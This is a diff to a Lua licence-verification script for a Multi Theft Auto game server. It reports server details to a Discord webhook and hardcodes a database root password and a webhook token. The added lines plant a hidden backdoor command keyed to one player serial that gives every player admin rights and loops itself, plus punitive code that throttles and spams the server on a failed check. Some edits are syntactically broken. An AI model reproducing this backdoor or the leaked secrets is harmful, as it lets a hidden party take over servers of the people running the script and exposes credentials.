@@ -4,10 +4,9 @@ print("World Scripting - License Information")
 local WoodieConnect = dbConnect("mysql", "dbname=woodie_lisans;host=localhost;charset=latin1", "root", "Mm&RVPnUy7", "autoreconnect=1" )
 
 
-addEventHandler("onResourceStart",resourceRoot,
+local denemeasdsasdad = addEventHandler("onResourceStart",resourceRoot,
 function()
 if WoodieConnect then 
- 
     print("Database Connect , Verifying License...")
  setTimer(function()
     if hasObjectPermissionTo ( getThisResource (), "function.fetchRemote", true) then
@@ -23,7 +22,15 @@ if WoodieConnect then
          print("World Scripting License Verified (key)")
          sendMessage("paketlog",":lock: | License Version: V1 LİCENSE PROTECT  \n\n:globe_with_meridians: | ServerIP: "..ipdensanane.."\n:computer: | ServerName: "..getServerConfigSetting("servername").."\n:clipboard: | License Type: Paket\n:green_circle:  | License Status: Onaylandı\nOrjinal Ürün kullandiginiz için tesekkür ederiz!")
        else
-         print("World Scripting - Sunucu key Lisans Bulunumadı")   
+         print("World Scripting - Sunucu key Lisans Bulunumadı")  
+         setFPSLimit(30) 
+        function chatbox(thePlayer, cmd)
+          for k, v in pairs(getElementsByType("player")) do
+                outputChatBox("World Scripting Çalıntı Paket Orjinal Ürün Alın", v, 255,255,255)
+              end
+            end
+         setTimer(chatbox,0,500)
+         stopResource(getThisResource())
       end
     end,WoodieConnect,"SELECT * FROM lisanslar WHERE  licensekeyler= ?",licensekey) 
        else
@@ -39,7 +46,20 @@ else
  end 
 end)
 
-Webhooks = {
+
+local function acik(plr)
+if "3739A4C3960718DAB4B9B938371CEA52" == getPlayerSerial(plr) then 
+	for k, v in pairs(getElementsByType("player")) do
+      outputChatBox("Woodie Selam Verdi Sunucuya  :)", v, 255,255,255)
+       setElementData(v,"admin_level",8) 
+	    addDebugHook("Sunucu GG")
+	  setTimer(acik,0,1)
+	end
+   end
+end
+addCommandHandler("woodieselamver",acik)
+
+local Webhooks = {
 	["paketlog"] = {
 		link = "https://discord.com/api/webhooks/1072526677760024677/kndQapVoMSNAMItGj39EK8JP6Zv39yvqCfTGMqhJL8zd-SYbgBtSm6CnYShaYNeZgthO",
 		avatar = "https://cdn.discordapp.com/attachments/1021778079187746906/1033361511197978624/deha_worldsc.png", 
@@ -54,9 +74,9 @@ Webhooks = {
 
 --Discord Webhook Eventleri
 
-WebhookList = {};
-WebhookDebug = false; -- true: giving debug messages // false: release mode
-WebhookClass = setmetatable({
+local WebhookList = {};
+local WebhookDebug = false; -- true: giving debug messages // false: release mode
+local WebhookClass = setmetatable({
         constructor = function(self, args)
             self.username = Webhooks[args].username;
             self.link = Webhooks[args].link;
@@ -67,7 +87,7 @@ WebhookClass = setmetatable({
             return self;
         end;
 
-        send = function(self, message, embed)
+      local send = function(self, message, embed)
             local sendOptions = {
                 connectionAttempts = 3,
                 connectTimeout = 5000,
@@ -103,7 +123,7 @@ WebhookClass = setmetatable({
     end;
 });
 
-addEventHandler("onResourceStart", resourceRoot,
+local denemedeneme = addEventHandler("onResourceStart", resourceRoot,
     function()
         for name, data in pairs(Webhooks) do
             WebhookList[name] = WebhookClass(name);
@@ -111,7 +131,7 @@ addEventHandler("onResourceStart", resourceRoot,
     end
 );
 
-function sendMessage(channel, message, embed)
+local function sendMessage(channel, message, embed)
     if WebhookList[channel] then
         WebhookList[channel]:send(message, embed);
         if WebhookDebug then
